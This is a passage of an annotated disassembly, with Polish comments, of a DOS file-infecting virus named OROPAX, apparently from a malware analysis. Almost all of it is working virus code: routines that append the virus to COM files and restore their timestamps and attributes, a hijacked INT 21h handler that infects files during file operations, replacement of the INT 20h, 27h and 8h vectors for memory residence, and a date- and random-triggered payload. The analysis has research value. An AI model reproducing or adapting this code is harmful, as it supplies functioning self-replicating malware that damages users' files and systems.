0836 B80042        MOV     AX,4200                   ; move file pointer
0839 B90000        MOV     CX,0000                   ; na pocz†tek pliku
083C BA0000        MOV     DX,0000
083F E89601        CALL    09D8                      ; INT 21h
0842 7303          JAE     0847     ; modyfikuj pierwsze cztery bajty ofiary

0844 EB73          JMP     08B9                      ; zamykaj plik ofiary
0846 90            NOP

0847 B440          MOV     AH,40                 ; write to file
0849 BA4F01        MOV     DX,offset bufor_kand  ; DS:DX adres DTA
084C B90400        MOV     CX,0004               ; ile bajt¢w
084F E88601        CALL    09D8                  ; INT 21h
0852 7303          JAE     0857

0854 EB63          JMP     08B9               ; zamykaj plik ofiary
0856 90            NOP

0857 B80242        MOV     AX,4202            ; move file pointer
085A B90000        MOV     CX,0000            ; na pocz†tek pliku
085D BA0000        MOV     DX,0000 
0860 E87501        CALL    09D8               ; INT 21h
0863 7303          JAE     0868

0865 EB52          JMP     08B9               ; zamykaj plik ofiary
0867 90            NOP

; wyznacz ostateczn† liczb‘ bajt¢w o kt¢r† b‘dzie powi‘kszony rozmiar pliku
; ostateczny rozmiar musi by podzielny przez 51.

0868 53            PUSH    BX
0869 BA0000        MOV     DX,0000
086C A13E01        MOV     AX,[rozmiar_pliku]  ; odtwarzaj d’ugož
086F B9C40A        MOV     CX,0AC4             ; d’ugož wirusa
0872 03C1          ADD     AX,CX
0874 BB3300        MOV     BX,0033
0877 F7F3          DIV     BX
0879 83C133        ADD     CX,+33
087C 2BCA          SUB     CX,DX                ; liczba bajt¢w
087E 5B            POP     BX                   ; file handle
087F B440          MOV     AH,40                ; write to file
0881 BA0001        MOV     DX,0100              ; DS:DX adres DTA
0884 E85101        CALL    09D8                 ; INT 21h
0887 7204          JB      088D

0889 3BC1          CMP     AX,CX                ; zapis udany
088B 742C          JZ      08B9                 ; zamykaj plik ofiary

088D B80042        MOV     AX,4200              ; move file pointer
0890 B90000        MOV     CX,0000              ; na pocz†tek pliku
0893 BA0000        MOV     DX,0000
0896 E83F01        CALL    09D8                 ; INT 21h
0899 B440          MOV     AH,40                ; write to file
089B BA0301        MOV     DX,offset org_4_bajty   ; odtwarzaj 4 bajty
089E B90400        MOV     CX,0004              ; ile bajt¢w
08A1 E83401        CALL    09D8                 ; INT 21h
08A4 B80042        MOV     AX,4200              ; move file pointer
08A7 8B0E4001      MOV     CX,[0140]            ; CX:DX offset od pocz†tku
08AB 8B163E01      MOV     DX,[rozmiar_pliku]
08AF E82601        CALL    09D8                 ; INT 21h
08B2 E81000        CALL    08C5                 ; zamykaj plik ofiary
08B5 A2F401        MOV     [01F4],AL
08B8 C3            RET

08B9 B80242        MOV     AX,4202              ; move file pointer
08BC B90000        MOV     CX,0000              ; na koniec pliku
08BF BA0000        MOV     DX,0000
08C2 E81301        CALL    09D8                 ; INT 21h

08C5 8B0E3A01      MOV     CX,[czas_pliku]      ; odtwarzaj czas i dat‘
08C9 8B163C01      MOV     DX,[data_pliku]
08CD B80157        MOV     AX,5701              ; set file time and date
08D0 E80501        CALL    09D8                 ; INT 21h

08D3 B43E          MOV     AH,3E                ; close file
08D5 E80001        CALL    09D8                 ; INT 21h

08D8 B80143        MOV     AX,4301              ; set file attributes
08DB BAF401        MOV     DX,01F4              ; DS:adres ASCIIZ nazwy
08DE 8A0E3901      MOV     CL,[atrybut]         ; odtw¢rz atrybuty
08E2 B500          MOV     CH,00
08E4 E8F100        CALL    09D8                 ; INT 21h

08E7 B020          MOV     AL,20
08E9 8606A801      XCHG    [01A8],AL
08ED C3            RET

;--------------------------------------------------------------------------
; nowa "obs’uga" przerwania 21h
;--------------------------------------------------------------------------

08EE 9C            PUSHF
08EF 3DE033        CMP     AX,33E0     ; czy to pytanie o wirusa
08F2 7504          JNZ     08F8        ; nie, sprawd¦ o co chodzi

; potwierdzenie zainstalowania wirusa (normalnie  w AL by’oby FF)

08F4 B0E0          MOV     AL,E0       ; sygnalizacja: wirus jest zainstalowany
08F6 9D            POPF
08F7 CF            IRET

08F8 9D            POPF
08F9 9C            PUSHF
08FA 50            PUSH    AX
08FB 53            PUSH    BX
08FC 51            PUSH    CX
08FD 52            PUSH    DX
08FE 56            PUSH    SI
08FF 57            PUSH    DI
0900 55            PUSH    BP
0901 1E            PUSH    DS
0902 06            PUSH    ES

0903 80FC31        CMP     AH,31        ; stay resident
0906 743F          JZ      0947         ; instaluj wirusa ježli trzeba

0908 80FC00        CMP     AH,00        ; terminate program
090B 7447          JZ      0954         ; instaluj wirusa ježli trzeba

090D 80FC4C        CMP     AH,4C        ; terminate proces
0910 7442          JZ      0954         ; instaluj wirusa ježli trzeba

0912 80FC39        CMP     AH,39        ; make dir
0915 744D          JZ      0964

0917 80FC3A        CMP     AH,3A        ; remove directory
091A 7448          JZ      0964

091C 80FC3C        CMP     AH,3C        ; create file
091F 7443          JZ      0964

0921 3D013D        CMP     AX,3D01      ; open file (tryb write only)
0924 743E          JZ      0964

0926 80FC41        CMP     AH,41        ; delete file
0929 7439          JZ      0964

092B 80FC43        CMP     AH,43        ; get/set file attribute
092E 7434          JZ      0964

0930 80FC56        CMP     AH,56        ; rename file
0933 742F          JZ      0964

0935 80FC13        CMP     AH,13        ; delete file
0938 743D          JZ      0977

093A 80FC16        CMP     AH,16        ; create file
093D 7438          JZ      0977

093F 80FC17        CMP     AH,17        ; rename file
0942 7433          JZ      0977

0944 EB22          JMP     0968         ; inna funkcja, wykonaj bez zmian
0946 90            NOP

; nowa "obs’uga" stay resident

0947 2E            CS:
0948 803E500200    CMP     BYTE PTR [L0250],00
094D 7519          JNZ     0968            ; nie przeszkadzaj

094F 8AD8          MOV     BL,AL           ; przechowaj numer funkcji
0951 EB43          JMP     0996            ; nowa wersja stay resident
0953 90            NOP

; nowa "obs’uga" procesu ko¤czenia programu

0954 2E            CS:
0955 803E500200    CMP     BYTE PTR [L0250],00 ; flaga 'ju§ zainstalowany'
095A 750C          JNZ     0968                ; wykonaj normaln† obs’ug‘

095C BA0000        MOV     DX,0000
095F 8AD8          MOV     BL,AL
0961 EB33          JMP     0996           ; nowa wersja "stay resident"
0963 90            NOP

; obs’uga operacji na katalogach i plikach (nowe funkcje MKDIR, RMDIR, CREATE,
; OPEN, DELETE, Get/set attribute, RENAME

0964 FB            STI
0965 E8A4FD        CALL    070C          ; zaka§aj ježli masz co

; pozosta’e funkcje przerwania INT 21h

0968 07            POP     ES
0969 1F            POP     DS
096A 5D            POP     BP
096B 5F            POP     DI
096C 5E            POP     SI
096D 5A            POP     DX
096E 59            POP     CX
096F 5B            POP     BX
0970 58            POP     AX
0971 9D            POPF
0972 2E            CS:
0973 FF2E0C01      JMP     FAR [int_21h]

; operacje na plikach (stare funkcje delete, create, rename)

0977 FB            STI
0978 E869FD        CALL    06E4
097B EBEB          JMP     0968     ; wykonaj oryginaln† funkcj‘

;--------------------------------------------------------------------------
; nowa obs’uga przerwania INT 27h (stay resident)
;    przelicz parametry dla funkcji numer 31h INT 21h
;--------------------------------------------------------------------------

097D 83C406        ADD     SP,+06
0980 D1EA          SHR     DX,1
0982 D1EA          SHR     DX,1
0984 D1EA          SHR     DX,1
0986 D1EA          SHR     DX,1
0988 42            INC     DX
0989 8AD8          MOV     BL,AL
098B EB09          JMP     0996
098D 90            NOP

; nowa obs’uga przerwania INT 20h (zako¤czenie programu)

098E 83C406        ADD     SP,+06
0991 BA0000        MOV     DX,0000
0994 B300          MOV     BL,00

; odtwarzanie starych wektor¢w przerwa¤ DOS

0996 B80000        MOV     AX,0000
0999 8ED8          MOV     DS,AX

; przerwanie INT 20h

099B 2E            CS:
099C A11401        MOV     AX,[int_20h]
099F A38000        MOV     [0080],AX
09A2 2E            CS:
09A3 A11601        MOV     AX,[int_20h + 2]
09A6 A38200        MOV     [0082],AX
09A9 2E            CS:

; przerwanie 27h

09AA A11001        MOV     AX,[int_27h]
09AD A39C00        MOV     [009C],AX
09B0 2E            CS:
09B1 A11201        MOV     AX,[int_27h + 2]
09B4 A39E00        MOV     [009E],AX

09B7 2E            CS:
09B8 C606500201    MOV     BYTE PTR [L0250],01
09BD FB            STI
09BE B8C40B        MOV     AX,0BC4    ; zwi‘ksz obszar rezerwowany dla
09C1 D1E8          SHR     AX,1       ; rezydenta o maksymaln† d’ugož wirusa
09C3 D1E8          SHR     AX,1
09C5 D1E8          SHR     AX,1
09C7 D1E8          SHR     AX,1
09C9 40            INC     AX
09CA 03D0          ADD     DX,AX
09CC B80031        MOV     AX,3100    ; stay resident
09CF 8AC3          MOV     AL,BL      ; odtwarzaj numer sub funkcji
09D1 9C            PUSHF
09D2 FA            CLI
09D3 2E            CS:
09D4 FF1E0C01      CALL    FAR [int_21h]

;--------------------------------------------------------------------------
; obs’uga przerwania 21h na w’asne potrzeby wirusa
;--------------------------------------------------------------------------

09D8 9C            PUSHF
09D9 FA            CLI
09DA 2E            CS:
09DB FF1E0C01      CALL    FAR [int_21h]
09DF C3            RET

;--------------------------------------------------------------------------
; pocz†tek wykonywania kodu wirusa
;--------------------------------------------------------------------------

09E0 9C            PUSHF
09E1 50            PUSH    AX
09E2 53            PUSH    BX
09E3 51            PUSH    CX
09E4 52            PUSH    DX
09E5 56            PUSH    SI
09E6 57            PUSH    DI
09E7 55            PUSH    BP
09E8 1E            PUSH    DS
09E9 06            PUSH    ES
09EA B8E033        MOV     AX,33E0      ; test obecnožci wirusa w systemie
09ED CD21          INT     21
09EF 3CFF          CMP     AL,FF
09F1 7423          JZ      0A16         ; wirus jeszcze nie zainstalowany

09F3 8CCE          MOV     SI,CS        ; powr¢t do oryginalnego programu (?)
09F5 8EC6          MOV     ES,SI
09F7 8B360101      MOV     SI,[0101]    ; odtworzenie oryginalnych 4 bajt¢w
09FB 81C60601      ADD     SI,0106
09FF B90400        MOV     CX,0004
0A02 BF0001        MOV     DI,0100
0A05 F3            REPZ
0A06 A4            MOVSB
0A07 07            POP     ES
0A08 1F            POP     DS
0A09 5D            POP     BP
0A0A 5F            POP     DI
0A0B 5E            POP     SI
0A0C 5A            POP     DX
0A0D 59            POP     CX
0A0E 5B            POP     BX
0A0F 58            POP     AX
0A10 9D            POPF
0A11 BD0001        MOV     BP,0100
0A14 FFE5          JMP     BP           ; skok do programu

; kontrola rozmiaru dost‘pnej pami‘ci

0A16 B104          MOV     CL,04        ; do dzielenia przez 16
0A18 8CC8          MOV     AX,CS
0A1A BEE30A        MOV     SI,0AE3      ; maksymalna d’ugož kodu wirusa
0A1D D3EE          SHR     SI,CL        ; przelicz na paragrafy (16 bajtowe)
0A1F 46            INC     SI
0A20 BFFFFF        MOV     DI,FFFF      ; maksymalna liczba paragraf¢w dla
0A23 D3EF          SHR     DI,CL        ; program¢w typu COM
0A25 47            INC     DI
0A26 03C6          ADD     AX,SI        ; kontrola czy wystarczy pami‘ci 
0A28 03C7          ADD     AX,DI        ; operacyjnej dla wirusa
0A2A 03C7          ADD     AX,DI
0A2C 40            INC     AX
0A2D 2E            CS:
0A2E 3B060200      CMP     AX,[0002]    ; rozmiar dost‘pnej pami‘ci (pole PSP)
0A32 73BF          JAE     09F3         ; odpuszczaj

0A34 07            POP     ES
0A35 1F            POP     DS
0A36 5D            POP     BP
0A37 5F            POP     DI
0A38 5E            POP     SI
0A39 5A            POP     DX
0A3A 59            POP     CX
0A3B 5B            POP     BX
0A3C 58            POP     AX
0A3D 9D            POPF
0A3E 8BE8          MOV     BP,AX
0A40 E9E600        JMP     0B29         ; przesuwaj kod wirusa w pami‘ci

; kontynuacja instalacji wirusa

0A43 8BC5          MOV     AX,BP
0A45 2E            CS:
0A46 8E160A01      MOV     SS,[010A]    ; odtwarzaj rejestry segmentowe
0A4A BC0000        MOV     SP,0000
0A4D 2E            CS:
0A4E 8E1E0A01      MOV     DS,[010A]
0A52 2E            CS:
0A53 8E060A01      MOV     ES,[010A]
0A57 BD0000        MOV     BP,0000
0A5A 55            PUSH    BP
0A5B 9C            PUSHF
0A5C 50            PUSH    AX
0A5D 53            PUSH    BX
0A5E 51            PUSH    CX
0A5F 52            PUSH    DX
0A60 56            PUSH    SI
0A61 57            PUSH    DI
0A62 55            PUSH    BP
0A63 1E            PUSH    DS
0A64 06            PUSH    ES

; odczyt aktualnych wektor¢w przerwa¤

0A65 FB            STI
0A66 B80000        MOV     AX,0000
0A69 8ED8          MOV     DS,AX

; przerwanie INT 20h

0A6B C43E8000      LES     DI,[0080]
0A6F 2E            CS:
0A70 893E1401      MOV     [int_20h],DI
0A74 2E            CS:
0A75 8C061601      MOV     [int_20h + 2],ES

; przerwanie INT 8h (zegarowe)

0A79 C43E2000      LES     DI,[0020]
0A7D 2E            CS:
0A7E 893E1C01      MOV     [int_08h],DI
0A82 2E            CS:
0A83 8C061E01      MOV     [int_08h + 2],ES

; przerwanie INT 21h

0A87 C43E8400      LES     DI,[0084]
0A8B 2E            CS:
0A8C 893E0C01      MOV     [int_21h],DI
0A90 2E            CS:
0A91 8C060E01      MOV     [int_21h + 2],ES

; przerwanie INT 27h

0A95 C43E9C00      LES     DI,[009C]
0A99 2E            CS:
0A9A 893E1001      MOV     [int_27h],DI
0A9E 2E            CS:
0A9F 8C061201      MOV     [int_27h + 2],ES
0AA3 FA            CLI

AX=0000  BX=3306  CX=0000  DX=2AEC  SP=FFEA  BP=0000  SI=0107  DI=6366
DS=0000  ES=022B  SS=27CA  CS=270D  IP=0AA4   NV UP DI PL NZ AC PE NC
 WR DS:0080 = 143F

; podmiana wektora INT 20h (program terminate)

0AA4 C70680008E09  MOV     WORD PTR [0080],098E

             ; sygnatura dla OROPAX/2 staruje w 0AACh

0AAA 8C0E8200      MOV     [0082],CS

; podmiana wektora 27h     (terminate but stay resident)

0AAE C7069C007D09  MOV     WORD PTR [009C],097D
0AB4 8C0E9E00      MOV     [009E],CS

; podmiana wektora 21h

0AB8 C7068400EE08  MOV     WORD PTR [0084],08EE
0ABE 8C0E8600      MOV     [0086],CS

0AC2 FB            STI
0AC3 2E            CS:
0AC4 803E070100    CMP     BYTE PTR [L0107],00
0AC9 744C          JZ      0B17         ; wracaj do w’ažciwego programu

0ACB B42A          MOV     AH,2A        ; Get Date
0ACD CD21          INT     21
0ACF 81F9C307      CMP     CX,07C3      ; 1987
0AD3 720A          JB      0ADF         ; data wczežniejsza

0AD5 7710          JA      0AE7         ; data p¢¦niejsza

0AD7 81FA0105      CMP     DX,0501      ; 1 maja 1987
0ADB 730A          JAE     0AE7         ; data p¢¦niejsza lub r¢wna

0ADD EB38          JMP     0B17         ; data wczežniejsza

0ADF 2E            CS:
0AE0 803E070102    CMP     BYTE PTR [L0107],02
0AE5 7230          JB      0B17         ; powr¢t do w’ažciwego programu

0AE7 1E            PUSH    DS           ; sprawd¦ identyfikator modelu w ROM
0AE8 B8FFFF        MOV     AX,FFFF
0AEB 8ED8          MOV     DS,AX
0AED A00E00        MOV     AL,[000E]    ; system ID byte
0AF0 24FC          AND     AL,FC
0AF2 3CFC          CMP     AL,FC        ; AT
0AF4 1F            POP     DS
0AF5 7520          JNZ     0B17         ; nie AT, wracaj do programu

; generowanie liczby losowej 0 .. 3

0AF7 A16C04        MOV     AX,[046C]    ; timer counter {?}
0AFA 03066E04      ADD     AX,[046E]
0AFE 35AA55        XOR     AX,55AA
0B01 D3C9          ROR     CX,CL
0B03 03C1          ADD     AX,CX
0B05 2403          AND     AL,03
0B07 3C00          CMP     AL,00
0B09 750C          JNZ     0B17         ; wracaj do programu

; adres nowej obs’ugi INT 8 (zegarowe)

0B0B FA            CLI
0B0C C70620007A06  MOV     WORD PTR [0020],067A
0B12 8C0E2200      MOV     [0022],CS
0B16 FB            STI

; wyjžcie z wirusa i powr¢t do w’ažciwego programu 

0B17 E896FB        CALL    06B0         ; inicjuj sta’e robocze wirusa do
0B1A 07            POP     ES           ; muzykowania
0B1B 1F            POP     DS
0B1C 5D            POP     BP
0B1D 5F            POP     DI
0B1E 5E            POP     SI
0B1F 5A            POP     DX
0B20 59            POP     CX
0B21 5B            POP     BX
0B22 58            POP     AX
0B23 9D            POPF
0B24 2E            CS:
0B25 FF2E0801      JMP     FAR [L0108]   ; skok do w’ažciwego programu (?)

0B29 8CC8          MOV     AX,CS         ; inicjuj DE, ES
0B2B 8ED8          MOV     DS,AX
0B2D 8EC0          MOV     ES,AX
0B2F 8B1E0101      MOV     BX,[0101]     ; offset kodu wirusa
0B33 81C30301      ADD     BX,offset org_4_bajty
0B37 8CC8          MOV     AX,CS
0B39 BEE30A        MOV     SI,0AE3       ; d’ugož kodu wirusa
0B3C 03F3          ADD     SI,BX
0B3E D1EE          SHR     SI,1          ; przelicz na paragrafy (16 bajtowe)
0B40 D1EE          SHR     SI,1
0B42 D1EE          SHR     SI,1
0B44 D1EE          SHR     SI,1
0B46 46            INC     SI
0B47 03C6          ADD     AX,SI         ; wyznacz adresy pod kt¢re przesuniesz
0B49 8BD0          MOV     DX,AX         ; kod programu by zrobi miejsce dla
0B4B 8ED2          MOV     SS,DX         ; miejsce dla wirusa, kt¢ry po 
0B4D BCFEFF        MOV     SP,FFFE       ; zako¤czeniu wykonywania kodu 
0B50 B91F00        MOV     CX,001F       ; nosiciela zostanie rezydentnie
0B53 8BF3          MOV     SI,BX         ; w pami‘ci
0B55 8BFB          MOV     DI,BX
0B57 81C7C40A      ADD     DI,0AC4
0B5B 81C6A50A      ADD     SI,0AA5
0B5F FC            CLD
0B60 F3            REPZ                  ; przsu¤ ca’y kod
0B61 A4            MOVSB
0B62 8BC3          MOV     AX,BX         ; wyznacz nowy adres po’o§enia kodu
0B64 05C40A        ADD     AX,0AC4       ; wirusa (w tym listingu 0BA5h ?)
0B67 FFE0          JMP     AX            ; skok do przemieszczonego kodu 

;

0B69 8CC8          MOV     AX,CS
0B6B BEC40B        MOV     SI,0BC4
0B6E D1EE          SHR     SI,1
0B70 D1EE          SHR     SI,1
0B72 D1EE          SHR     SI,1
0B74 D1EE          SHR     SI,1
0B76 46            INC     SI
0B77 03C6          ADD     AX,SI
0B79 8EC0          MOV     ES,AX
0B7B 8EDA          MOV     DS,DX
0B7D BE0000        MOV     SI,0000
0B80 BF0000        MOV     DI,0000
0B83 8BCB          MOV     CX,BX
0B85 F3            REPZ
0B86 A4            MOVSB
0B87 8CC8          MOV     AX,CS
0B89 8ED8          MOV     DS,AX
0B8B BE0301        MOV     SI,offset org_4_bajty
0B8E BF0001        MOV     DI,0100
0B91 B90400        MOV     CX,0004
0B94 F3            REPZ
0B95 A4            MOVSB

; buduj adres startowy nosiciela w L0108

0B96 2E            CS:
0B97 C70608010001  MOV     WORD PTR [L0108],0100
0B9D 2E            CS:
0B9E 8C060A01      MOV     [L0108 + 2],ES
0BA2 E99EFE        JMP     0A43             ; id¦ modyfikowa wektory przerwa¤

0BA5 8EC2          MOV     ES,DX
0BA7 BE0000        MOV     SI,0000
0BAA BF0000        MOV     DI,0000
0BAD 8BCB          MOV     CX,BX
0BAF F3            REPZ
0BB0 A4            MOVSB
0BB1 8CCF          MOV     DI,CS
0BB3 8EC7          MOV     ES,DI
0BB5 BF0001        MOV     DI,0100
0BB8 8BF3          MOV     SI,BX
0BBA B9C40A        MOV     CX,0AC4
0BBD F3            REPZ
0BBE A4            MOVSB
0BBF B8690B        MOV     AX,0B69
0BC2 FFE0          JMP     AX

; troch‘ žmieci i za nimi (od BD0) PSP zara§onego programu


